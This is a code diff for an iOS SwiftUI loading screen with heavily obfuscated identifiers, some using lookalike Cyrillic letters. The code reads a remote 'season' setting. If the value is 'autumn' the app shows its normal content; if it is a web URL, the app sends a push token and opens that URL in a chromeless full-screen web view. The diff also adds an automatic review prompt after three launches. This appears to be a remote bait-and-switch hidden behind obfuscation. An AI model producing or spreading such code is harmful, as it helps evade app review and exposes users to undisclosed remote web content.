@@ -8,6 +8,9 @@ struct Loadingsdfm43kkkk534View: View {
     @State private var ringRdsfskk43otation: Double = 0
     @State private var sdfskdkLeftweLeaf: CGFloat = 0
     @State private var treeOpsdfk43kk5acity: Double = 0.4
+    
+    @AppStorage("le_launch_count") private var leLАО_аsfsgunchCount: Int = 0
+    @AppStorage("le_review_requested") private var leReviKFKfregRequested: Bool = false
     @Environment(\.accessibilityReduceMotion) private var reduceMotion
     @State private var Aldewemttext = ""
     @State private var DSj_halo43995623dfs = false
@@ -77,7 +80,8 @@ struct Loadingsdfm43kkkk534View: View {
             }
         }
         .onAppear {
-            sdfsdfkkSDeventTrack43995r.sharedsdfsk43.tracksdf_Ds435AppLoad34()
+            reegisdjfjsdfRate_mdfsdf()
+            DekrequiestIfNeeded_FKdjsgsdg()
             glowSsdfsdkfcale = 1.15
             ringRdsfskk43otation = 360
             sdfskdkLeftweLeaf = -10
@@ -100,26 +104,39 @@ struct Loadingsdfm43kkkk534View: View {
             
             DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                 Task {
-                    await routeFromCachedOrFetch()
+                    await sfdskgkrouteSrachthc()
                 }
+                sdfmskdfkkJDSJfkrtateRateApp2324.dsfmsdjjREeview324()
             }
         }
     }
     
-    private func routeFromCachedOrFetch() async {
-        if let cachedEnvelope = LDs_3535kdskfjDSkf43245.shared
+    func reegisdjfjsdfRate_mdfsdf() {
+        leLАО_аsfsgunchCount += 1
+    }
+
+    func DekrequiestIfNeeded_FKdjsgsdg() {
+        guard !leReviKFKfregRequested, leLАО_аsfsgunchCount >= 3 else { return }
+        leReviKFKfregRequested = true
+        DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
+            sdfmskdfkkJDSJfkrtateRateApp2324.dsfmsdjjREeview324()
+        }
+    }
+    
+    private func sfdskgkrouteSrachthc() async {
+        if let cachedEnvelope = JJFCinfigureJFJJFContainterAggregate.shaIFapprend_gfdgdfg
             .loadPeevreventEnvelopeFromUserDefaults(),
            let cachedSeason = cachedEnvelope.config?.season,
            !cachedSeason.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
         {
-            await applyRouting(seasonRaw: cachedSeason)
+            await applysafk435Routing(seasonRaw: cachedSeason)
             return
         }
 
         do {
-            let envelope = try await LDs_3535kdskfjDSkf43245.shared
+            let envelope = try await JJFCinfigureJFJJFContainterAggregate.shaIFapprend_gfdgdfg
                 .fetchDecodeAndPersiJjjxjstRemoteContemxntEnvelope()
-            await applyRouting(seasonRaw: envelope.config?.season)
+            await applysafk435Routing(seasonRaw: envelope.config?.season)
         } catch {
             await MainActor.run {
                 SDKF_Dshudj234Finish324 = true
@@ -129,28 +146,36 @@ struct Loadingsdfm43kkkk534View: View {
     }
 
     @MainActor
-    private func applyRouting(seasonRaw: String?) {
+    private func applysafk435Routing(seasonRaw: String?) {
         let season = (seasonRaw ?? "").trimmingCharacters(in: .whitespacesAndNewlines)
+
         if season.lowercased() == "autumn" {
-            withAnimation(.easeInOut) {
-                SDKF_Dshudj234Finish324 = true
-            }
-        } else if let url = URL(string: season), !season.isEmpty {
-            switchToWeb(urlString: season)
-        } else {
-            SDKF_Dshudj234Finish324 = true
+            withAnimation(.easeInOut) { SDKF_Dshudj234Finish324 = true }
+            return
         }
+
+        if let url = URL(string: season),
+           let scheme = url.scheme,
+           ["http", "https"].contains(scheme.lowercased()) {
+            switcDKKFKWEb323545hToWeb(urlString: season)
+            return
+        }
+
+        SDKF_Dshudj234Finish324 = true
     }
 
     @MainActor
-    private func switchToWeb(urlString: String) {
+    private func switcDKKFKWEb323545hToWeb(urlString: String) {
         guard let url = URL(string: urlString) else { return }
+
+        FKPus_Fm436htokenManagerPromise.dsinitINIIININ.trySendTokenIfPossible()
+
         guard
             let scene = UIApplication.shared.connectedScenes.compactMap({ $0 as? UIWindowScene }).first,
-            let root  = scene.keyWindow?.rootViewController
+            let root = scene.keyWindow?.rootViewController
         else { return }
 
-        let vc = DSKfkk_kkdfsf943935SDkw324(url: url)
+        let vc = EbdsWeb_FdkgkkdsgkInitResponse(url: url)
         let nav = UINavigationController(rootViewController: vc)
         nav.setNavigationBarHidden(true, animated: false)
         nav.modalPresentationStyle = .fullScreen
